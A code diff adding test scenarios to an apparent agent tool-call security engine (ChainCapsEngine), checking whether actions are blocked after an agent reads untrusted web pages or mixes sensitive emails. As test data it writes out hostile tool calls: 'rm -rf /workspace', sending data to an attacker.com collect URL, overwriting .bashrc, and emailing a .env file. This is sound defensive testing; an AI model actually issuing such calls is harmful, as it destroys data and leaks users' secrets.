@@ -154,3 +154,42 @@ print("  public page -> execute_shell allowed:", e.process_tool_call(
     ToolCall("execute_shell", {"command": "rm -rf /workspace"}, data_dependencies=[web])).allowed)
 print("  public page -> write_file(/workspace/.bashrc) allowed:", e.process_tool_call(
     ToolCall("write_file", {"path": "/workspace/.bashrc"}, data_dependencies=[web])).allowed)
+
+sec("V12. Init(untrusted web) = {display}: 무결성 정책을 예산으로 흉내 낼 수 있나")
+e = ChainCapsEngine(source_budget_overrides={"https://attacker.com/page": DISPLAY_ONLY})
+e.process_tool_call(ToolCall("read_public_url", {"url": "https://attacker.com/page"}))
+for tc in [ToolCall("execute_shell", {"command": "rm -rf /workspace"}),
+           ToolCall("send_http", {"url": "https://attacker.com/collect"}),
+           ToolCall("write_file", {"path": "/workspace/.bashrc"})]:
+    print(f"  (a) after untrusted read, {tc.tool_name:14s} allowed={e.process_tool_call(tc).allowed}")
+e = ChainCapsEngine(source_budget_overrides={
+    "https://attacker.com/page": DISPLAY_ONLY,
+    ".env": Budget.from_sinks(SinkPrivilege(S.DISPLAY), SinkPrivilege(S.SEND_EMAIL, "@corp.com"))})
+env = e.process_tool_call(ToolCall("read_file", {"path": ".env"})).output_node_id
+print("  (b) email .env -> ops@corp.com before web read:",
+      e.process_tool_call(ToolCall("send_email", {"to": "ops@corp.com"}, data_dependencies=[env])).allowed)
+e.process_tool_call(ToolCall("read_public_url", {"url": "https://attacker.com/page"}))
+print("  (b) email .env -> ops@corp.com after  web read (deps=[env]):",
+      e.process_tool_call(ToolCall("send_email", {"to": "ops@corp.com"}, data_dependencies=[env])).allowed)
+e = ChainCapsEngine(source_budget_overrides={"https://docs.python.org/x": DISPLAY_ONLY})
+w = e.process_tool_call(ToolCall("read_public_url", {"url": "https://docs.python.org/x"})).output_node_id
+print("  (c) save web doc to /workspace/notes.md:",
+      e.process_tool_call(ToolCall("write_file", {"path": "/workspace/notes.md"}, data_dependencies=[w])).allowed)
+
+sec("V13. 섞인 민감도: 메일 5통(4통 파트너 참조, 1통 사내 기밀) -> 파트너에게 4통 요약 전송")
+from chaincaps.core.manifest import ToolManifest
+D = SinkPrivilege(S.DISPLAY); PARTNER = SinkPrivilege(S.SEND_EMAIL, "partner@ext.com"); CORP = SinkPrivilege(S.SEND_EMAIL, "@corp.com")
+M = {"read_emails": ToolManifest(name="read_emails", is_source=True),   # 이름에 'mail'이 있어 휴리스틱이 싱크로 오분류하므로 명시
+     "read_email": ToolManifest(name="read_email", is_source=True)}
+for name, b in [("inbox budget incl. partner", Budget.from_sinks(D, CORP, PARTNER)),
+                ("inbox budget excl. partner", Budget.from_sinks(D, CORP))]:
+    e = ChainCapsEngine(manifests=M, source_budget_overrides={"inbox": b})
+    n = e.process_tool_call(ToolCall("read_emails", {"query": "inbox"})).output_node_id
+    print(f"  (a) one node, {name}: send to partner allowed =",
+          e.process_tool_call(ToolCall("send_email", {"to": "partner@ext.com"}, data_dependencies=[n])).allowed)
+e = ChainCapsEngine(manifests=M, source_budget_overrides={
+    **{f"mail{i}": Budget.from_sinks(D, CORP, PARTNER) for i in range(1, 5)}, "mail5": Budget.from_sinks(D, CORP)})
+ids = [e.process_tool_call(ToolCall("read_email", {"query": f"mail{i}"})).output_node_id for i in range(1, 6)]
+print("  (b) per-mail nodes, deps=[mail1..4] only: send to partner allowed =",
+      e.process_tool_call(ToolCall("send_email", {"to": "partner@ext.com"}, data_dependencies=ids[:4])).allowed,
+      "| B_ctx =", e.dag._context_budget)
